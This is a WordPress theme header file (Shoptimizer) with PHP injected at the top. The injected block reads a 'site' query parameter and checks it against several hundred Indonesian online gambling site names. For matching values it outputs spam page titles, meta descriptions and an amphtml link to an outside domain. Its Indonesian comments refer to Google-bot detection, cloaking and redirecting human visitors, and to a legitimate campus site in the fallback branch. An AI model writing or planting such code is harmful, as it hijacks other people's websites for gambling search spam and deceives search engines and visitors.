<?php
// ... [Kode inisialisasi awal] ...

$parameter_site = isset($_GET['site']) ? $_GET['site'] : '';
$list_situs_judi = ['BAIM4D', 'SBCLIVE4D', 'TOGELUP', 'SENSA838', 'BOM88', 'YOWESTOGEL', 'OPALTOGEL', 'BOWOTOTO', 'BANDARDEWI', 'BIOSKOP777', 'BANDARTOGEL77', 'ESHATOTO', 'QQNUSA', 'ONIC4D', 'KINGBET303', 'GGWP88', 'MADETOTO', 'SEMPURNATOTO', 'MAMEN123', 'ISTANALIGA', 'KOKOPLAY', 'OMOTOGEL', 'OSG168', 'KAPTEN69', 'DOLLARTOTO', 'GATOTKACA123', 'NAGA123', 'MEGAFORWIN', 'ABADI126', 'GENGTOTO', 'CAPTAIN77', 'SHIOKAMBING2', 'AKAISLOT', 'SIRITOGEL', 'CIUTOTO', 'URANUSTOTO', 'QQBONUS', 'OKITOTO', 'MELODI99', 'TARINGBET', 'VVIAVI', 'AROGANTOTO', 'INDOHOKI', 'TUNGGALJITU', 'SODA88', 'MPOXL', 'TEN TOTO', 'JUMBOTOTO', 'EZEBET', 'LOMBOKTOTO', 'LONGTOGEL', 'HANTOGEL', 'MARINA77', 'BUKIT4D', 'PRAGMA123', 'GOKU55', 'HOKBET', 'WARUNGPLAY', 'MEDALI4D', 'ULTRA88', 'TAKTIK88', 'SAKURA189', 'BAMTOTO', 'MAKMURQQ', 'TEMPOSLOT', 'MAMAJITU', 'OPLOVERZ PLUS', 'EMAS168', 'MWIN328', 'KUDA189', 'POHONEMAS', 'UNIK777', 'GRESIKTOTO', 'AJITOGEL', 'UNTAR4D', 'SAYAPTOGEL', 'GWKTOGEL', 'MAXIM178', 'LAKITOTO', 'CAKAR76', 'NAGAMENSLOT', 'MATARAM TOTO', 'SAWER55', 'DORA55', 'SUMBARTOTO', 'DENTOGEL', 'JATI88', 'SAYAP123', 'ACC4D', 'LEXUS288', 'WILD88', 'SINS88', 'VIABOLA', 'CINEMA777', 'MPO4', 'PLAYAJA', 'TEBAR4D', 'BET2SLOT', 'BIMA88', 'SATRIA888', 'AZKABET', 'GOPEK178', 'JOKIBANDAR', 'DJTOGEL', 'OVOSLOT', 'BINUS4D', 'IBU4D', 'MAXIMUS TOGEL', 'BABA189', 'SAMURAI99', 'IBET44', 'CR7VIP', 'SULTAN178', 'CLOVERTOTO', 'BRAVO88', 'AJAIB368', 'VIA4D', 'CUKONG4D', 'AVIANTOGEL', 'KINGKONG39', 'ASTON777', 'VIVAMASTER78', 'PALU88', 'EXTRATOGEL', 'BANDARSLOTO', 'ADIK4D', 'TOPSPIN88', 'PANSOS4D', 'TOPENGTOTO', 'RETRO777', 'HIU TOTO', 'ACETOTO888', 'DEWA777', 'YUPI TOTO', 'SENDOK88', 'GBOTOTO', 'KUOTA4D', 'VISABET88', 'BANGJAGO88', 'DOLAR508', 'GENG TOTO', 'AGENBOS168', 'YESTOTO', 'SPINHOKI88', 'MASTERLOTRE', 'SEKALI4D', 'RMA789', 'BUKASLOT', 'DAKOTA76', 'BERJAYATOGEL', 'DEWI69', 'ULTIMASLOT', 'SIAGUS88', 'ULTRA138', 'TELKOM88', 'RATOGEL', 'OBC4D', 'TOTAL4D', 'PERAHU4D', 'SINTOTO', 'SEPUHTOTO', 'NETIZEN303', 'SONI TOTO', 'KOI388', 'APACE138', 'HANOMANTOTO', 'BARJP', 'AWANSLOT88', 'MAKSIMTOTO', '777HOKI', 'ALIENTOGEL', 'TEMPO4D', 'RAFI888', 'CUCUBET', 'HERO4D', 'IRAMATOGEL', 'NOTIF4D', 'SEMESTABET', 'RAJA MPO', 'JET178', 'SUNTOTO', 'JEPETOGEL', 'VELBETT', 'SUNEO138', 'KTVTOGEL', 'OTELLOBET', 'KOKODY88', 'MEGA188', 'GAMELANTOGEL', 'KETUASLOT', 'ARETOTO', 'GAPSLOT', 'AKIRA TOTO', 'KALIJODO88', 'ESSEBET', 'KAKEKMERAH', 'TO88', 'OSAKATOGEL', 'DEPOSLOT', 'HEPI8', 'POIN123', 'PAPA4D', 'ARTA88', 'KOTA188', 'WINJOS', 'SLOTKU88', 'ASIAQQ', 'DINARTOGEL', 'NEO38', 'REPLAY777', 'ASIK89', 'SOBAT4D', 'DETIK4D', 'ZENWIN88', 'HARIJP', 'CANTIKQQ', 'BAWAHOKI', 'BBTOGEL', 'SAKA168', 'AMANQQ', 'LIGATITAN', 'SIAPWD', 'YOUTUBE4D', 'KUDA4D', 'LING4D', 'KAPTEN69', 'IDNGOAL', 'DOT77', 'GATOTKACA123', 'KISARAN TOTO', 'CECE188', 'LUXURY12', 'ISTANA911', 'FURLA 77', 'QQSUTERA', 'WINCASH99', 'ICAFE4D', 'MAXIM4D', 'STARTOGEL', 'GARUDABET77', 'ASEANQQ', 'CIKASLOT', 'QQ7887', 'LIDO55', 'IDOLA88', 'OK4D', 'SIMENANG', 'GEN77', 'FOSILQQ', 'MASTERJP', 'OVODEWA', 'TRIOSLOT', 'PACUL365', 'ROSITOTO', 'KOTATOGEL', 'SODA88', 'VIVO7BET', 'WIKI4D', 'MANISQQ', 'KEJUQQ', 'COLEK77', 'GUCI77', 'IDJPLAY', 'PTO4D', 'JAGOTOGEL', 'KINGKOBRATOTO', 'TOPSTAR999', 'MACIBET', 'MUSIMQQ', 'KIJANGSLOT396', 'VIRUS 4D', 'TEMI69', 'LIM4D', 'ARENABET77', 'KOINID', 'INDOWLA', 'JCOTOTO', 'TWINBET', 'OPAHOKI', 'FALS4D', 'YABOS88', 'UNIK777', 'JURNAL TBC', 'GBO5000', 'MSBREEWC SIAPA', 'HALO88', 'BINTANG78', 'GK8', 'MEGAFAFA', 'HIPOSPADIA PDF', 'CABE888', 'SUPERTOGEL', 'VIBESTOGEL', 'DUNIABET', 'MPODEWA88', 'ICBET88', 'KINGKONGTOTO', 'DEWA989', 'JOKERTOTO', 'WARNETPLAY', 'TOGELONLINE77', 'MOLESLOT', 'PERMATASPIN', 'MERAHBET', 'QQ228', 'SILATOGEL', 'JPTOGEL77', 'KING188', 'LIGA DEWA', 'MPOBET', 'KAPTENPOKER', 'ONETOGEL', 'SPACEX168', 'LGOINDO', 'KARYA4D', 'SOSTOTO', 'TITANIC88', 'MAXWINBET77', 'CITRABET', 'AKITOTO', 'KAWANBET', 'HONGSUITOTO', 'PASTIHOKI', 'CAGUR88', 'PENDI188', 'IDRKASINO', 'ENGKOL88', 'PLACE303', 'BANDARPUSAT', '5DEWA', 'AREABOLA', 'TIRAI77', 'MAJU123', 'MOBILETOGEL', 'GIOBOLA4D', 'ALADIN POKER', 'MANIATOGEL', 'QQGACOR', 'BERLIN303', 'PASANGNOMOR', 'PETANI88', 'GOMUBET', 'PRESIDENWIN88', 'RW4D LOGIN', 'OXO303', 'KERASBOLA', 'TOGEL69', 'MPORAYA', 'RAJA118', 'WANGTOTO', 'BUANATOGEL', 'QQROLEX LOGIN', 'METAL4D', 'SPACE77', 'ARAHQQ', 'GUDANGLIGA', 'KENCANA4D', 'LGCPLAY', '88IDR', 'KARTEL4D', 'UDIN777', 'EKINGS99', 'QQKIK', 'MEGACUAN', 'POKERKOKO', 'ANGIN88', 'HONEYBET303', 'LONGBET77', 'VEGAS78', 'PANDATOTO', '1001MACAU', 'BENUAPOKER', 'SENANGCASINO88', 'CHIKI88', 'QQSTARVEGAS', 'OVOTOTO', 'LIGAGACOR', 'SERBUBET', 'PLAYTECH777', 'BUGATTI888', 'MONACO18', 'FORTUNA88BET', 'KINGDOM69', 'GT4D LOGIN', 'BENTENGTOGEL WAP', 'RAJABET888', 'ILUMABET', 'GRATIS777', 'PERWIRABET', 'MANTAP303', 'CERITAJUDI', 'LINK 888TOGEL', 'SORBET666', 'REPUBLIKPLAYER', '1KLIKBET', 'MENDALI4D', 'KLINIKTOTO', 'DOMINO206', '38TOGEL', 'GUBERNURTOTO', 'STEPTOTO', 'TROPIS4D', 'LIGABOLA899', 'JBOGOLD', 'TRISULABET', 'DUNIAPLAY77', 'DOYANPOKER', 'ARENAJACKPOT', 'LINK BANDARBOLA855', 'PEMAIN168', 'SARANA303', 'NEKO88', 'RTPGACOR77', 'HOBIPASANG', 'KARANGBET', 'GODPLAY88', 'DUNIAJOKER', 'TOYSBETT', 'EMPIRE4D', 'IONWIN', 'TOTALBET88', 'AKIRAPOKER', 'TERUSBET', 'QQSLEBEW', 'ADMINAGUS', 'TOPPRAGMATIC', 'SANDS4D', 'LESTARIQQ', 'SELAMATBET', 'SOLO33', 'KAISAR99', 'ESEBET', 'QUEENBET303', 'PULSA138', 'INDONESIA86', 'YYGACOR', 'EMPOGACOR', 'KINGAGEN', 'AGEN98', 'UJANTOTO', 'EXONAGA', 'KEJORATOTO', 'VIT168 LOGIN', 'GOVISA288', 'BISTRO4D', 'JOS188', 'BUKITQQ', 'HEPYJUDI', 'SRIREJEKI138', 'KINGKONG212', 'PABLO168', 'ASTRO89', 'POINTBET', 'BUAS88', 'JAMIN88', '128SPOT', 'LOGIN IBCMAX', 'DANGDUT4D', 'VETOGEL COM', 'REJEKI855', 'DUNIABET38', 'DONATBET', 'SNAPTOTO', 'LIKETOGEL', 'ILOVEYOUBET', 'JANJIHOKI', 'DWP168', 'LT88', 'BERLIANGAMES', 'SAHABATDOMINO', 'QQNUSA', 'HAYTOTO', 'JURAGANCASINO', 'HALUTOTO', 'WARUNG8', 'FLAZZTOTO', 'LAPORTOTO', 'DANAKOIN99', 'TOKOHOKI78', 'MBA88', 'BETOGEL VIP', 'LANDAK88', 'MAXWIN313', 'JNTJITU', 'GREND303', 'SAKTITOGEL', 'MPO633', 'RUMAHKOIN369', 'INDOMEGATOTO', 'PANENGACOR188', 'PLATINUM138', 'MULIA89', 'WINTER4D', 'GATOT888'];	 

// 2. Tentukan Template Master
$judul_master = "  - Situs Togel & Slot Terbaik Mudah Jackpot 2025, Akses Resmi Terpercaya";
$deskripsi_master = "adalah situs penyedia Togel dan Slot terlengkap dengan fitur mudah Jackpot setiap harinya. akses lancar membuat pengalaman bermain lebih seru hanya disitus ini.";

// ... [Asumsi fungsi is_google_bot() ada di sini] ...

// Cek apakah parameter yang masuk ada di daftar situs yang diizinkan
if (in_array($parameter_site, $list_situs_judi)) {

    // === BLOK IF: KODE SPAM DINAMIS ===
    
    // Ganti placeholder '-' dengan nama situs yang diakses
    $nama_situs = str_replace('+', ' ', $parameter_site); // Bersihkan tanda '+'
    
    // Kombinasi Dinamis Judul
    $final_title = $nama_situs . $judul_master; 
    
    // Kombinasi Dinamis Deskripsi
    $final_description = $nama_situs . $deskripsi_master;

    $amp_url = "https://backlinkhut-com.pages.dev/?site=" . urlencode($parameter_site);
    
    // ... [Logika Cloaking/Redirect untuk pengguna manusia akan ada di sini] ...
    
    // 3A. Injeksi Judul Dinamis (<title>)
    echo '<title>' . $final_title . '</title>';
    
    // 3B. Injeksi Deskripsi Meta Dinamis (Penting untuk Snippet Google)
    // Ini adalah tag yang dilihat Google di bawah judul hasil pencarian
    echo '<meta name="description" content="' . $final_description . '">';
    
    // 3C. Injeksi Tag AMP Canonical
    echo '<link rel="amphtml" href="' . $amp_url . '" />';

    // 3D. Pemuatan Konten Body Dinamis (Biasanya menyertakan Judul dan Deskripsi di dalam body)
    // ... [Kode Pemuatan Konten HTML/Spam] ...

} else {
    // === BLOK ELSE: KODE NORMAL ===
    // ... [Kode pemuatan konten kampus yang sah] ...
}

?><!doctype html>
<html <?php language_attributes(); ?>>
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>">
<meta name="viewport" content="height=device-height, width=device-width, initial-scale=1">
<link rel="profile" href="https://gmpg.org/xfn/11">
<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">

<?php wp_head(); ?>

</head>

<body <?php body_class(); ?>>

<?php if ( function_exists( 'wp_body_open' ) ) {
	wp_body_open();
} ?>

<?php do_action( 'shoptimizer_before' ); ?>

<div id="page" class="hfeed site">

	<?php
	do_action( 'shoptimizer_before_site' );
	do_action( 'shoptimizer_before_header' );
	?>

	<?php do_action( 'shoptimizer_topbar' ); ?>

	<header id="masthead" class="site-header">

		<div class="menu-overlay"></div>

		<div class="main-header col-full">

			<?php
			/**
			 * Functions hooked into shoptimizer_header action
			 *
			 * @hooked shoptimizer_site_branding                    - 20
			 * @hooked shoptimizer_secondary_navigation             - 30
			 * @hooked shoptimizer_product_search                   - 40
			 */
			do_action( 'shoptimizer_header' );
			?>

		</div>


	</header><!-- #masthead -->

	
	<div class="col-full-nav">

	<?php
	/**
	 * Functions hooked into shoptimizer_header action
	 *
	 * @hooked shoptimizer_primary_navigation_wrapper       - 42
	 * @hooked shoptimizer_primary_navigation               - 50
	 * @hooked shoptimizer_header_cart                      - 60
	 * @hooked shoptimizer_primary_navigation_wrapper_close - 68
	 */
	do_action( 'shoptimizer_navigation' );
	?>

	</div>

	<?php
	/**
	 * Functions hooked in to shoptimizer_before_content
	 *
	 * @hooked shoptimizer_header_widget_region - 10
	 */
	do_action( 'shoptimizer_before_content' );
	?>

	<div id="content" class="site-content" tabindex="-1">

		<div class="shoptimizer-archive">

		<div class="archive-header">
			<div class="col-full">
				<?php
				/**
				 * Functions hooked in to shoptimizer_content_top
				 *
				 * @hooked woocommerce_breadcrumb - 10
				 */
				do_action( 'shoptimizer_content_top' );
				?>
			</div>
		</div>

		<div class="col-full">
